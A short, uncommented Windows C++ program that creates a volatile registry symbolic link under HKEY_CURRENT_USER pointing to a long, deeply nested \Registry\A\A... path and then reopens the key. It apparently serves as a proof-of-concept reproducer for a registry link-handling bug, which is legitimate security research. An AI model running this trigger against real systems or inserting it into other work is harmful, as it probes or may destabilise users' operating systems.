#define WIN32_NO_STATUS
#include <Windows.h>
#undef WIN32_NO_STATUS
#include <winternl.h>
#include <ntstatus.h>

#include <cstdio>

int main() {
  HKEY hSymLink;
  LONG st = RegCreateKeyExW(HKEY_CURRENT_USER,
                            L"Test",
                            0,
                            NULL,
                            REG_OPTION_VOLATILE | REG_OPTION_CREATE_LINK,
                            KEY_ALL_ACCESS,
                            NULL,
                            &hSymLink,
                            NULL);

  if (st != ERROR_SUCCESS) {
    printf("RegCreateKeyExW failed with error %d\n", st);
    return 1;
  }

  WCHAR LinkTarget[] = L"\\Registry\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\"
                        "A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\A\\";

  st = RegSetKeyValueW(hSymLink,
                       NULL,
                       L"SymbolicLinkValue",
                       REG_LINK,
                       LinkTarget,
                       wcslen(LinkTarget) * sizeof(WCHAR));

  if (st != ERROR_SUCCESS) {
    printf("RegSetKeyValueW failed with error %d\n", st);
    return 1;
  }

  RegCloseKey(hSymLink);

  st = RegOpenKeyExW(HKEY_CURRENT_USER, L"Test", 0, KEY_ALL_ACCESS, &hSymLink);

  printf("RegOpenKeyExW returned %d\n", st);

  if (st == ERROR_SUCCESS) {
    RegCloseKey(hSymLink);
  }

  return 0;
}
